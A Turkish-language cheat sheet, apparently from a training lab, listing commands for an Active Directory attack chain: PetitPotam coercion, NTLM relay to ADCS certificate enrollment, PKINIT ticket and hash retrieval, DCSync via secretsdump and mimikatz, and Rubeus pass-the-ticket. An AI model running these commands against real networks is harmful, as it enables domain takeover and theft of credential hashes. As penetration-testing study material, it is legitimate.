| Komut | Açıklama | Kullanıcı | Hedef | Notlar |
| --- | --- | --- | --- | --- |
| `git clone https://github.com/topotam/PetitPotam.git` | PetitPotam exploit kodunu indirmek | Linux Kullanıcı | - | Git kullanılarak yapılır. |
| `python3 PetitPotam.py 172.16.5.225 172.16.5.5` | PetitPotam exploit kodunu çalıştırmak | Linux Kullanıcı | Hedef (Domain Controller) | Hedef IP adresleri belirtilir. |
| `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController` | NTLM relay oluşturmak için Impacket aracı | Linux Kullanıcı | Hedef (CA Sunucu) | Sunucu sertifika kayıt URL'si belirtilir. |
| `python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$ -pfx-base64 <base64 certificate> = dc01.ccache` | TGT bileti almak için Impacket aracı | Linux Kullanıcı | Domain Controller | Base64 sertifika ve ccache dosyası oluşturulur. |
| `klist` | Ccache dosyasının içeriğini görüntüle | Linux Kullanıcı | - | Kerberos bilet bilgilerini gösterir. |
| `python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$` | NTLM hash değerleri almak | Linux Kullanıcı | Domain Controller | TGS istekleri gönderilir ve hash değerleri alınır. |
| `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` | NTLM hash değerlerini NTDS.dit dosyasından çıkarmak | Linux Kullanıcı | Domain Controller | DCSync saldırısı ve TGT bileti kullanılır. |
| `secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba` | NTLM hash değerlerini NTDS.dit dosyasından çıkarmak | Linux Kullanıcı | Domain Controller | DCSync saldırısı ve yakalanan hash değeri kullanılır. |
| `.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /<base64 certificate>=/ptt` | Pass-the-ticket saldırısı yapmak | Windows Kullanıcı | Domain Controller | Makine hesabı kullanılarak TGT bileti alınır. |
| `mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt` | DCSync saldırısı yapmak | Windows Kullanıcı | Domain Controller | Mimikatz kullanılarak DCSync saldırısı yapılır. |
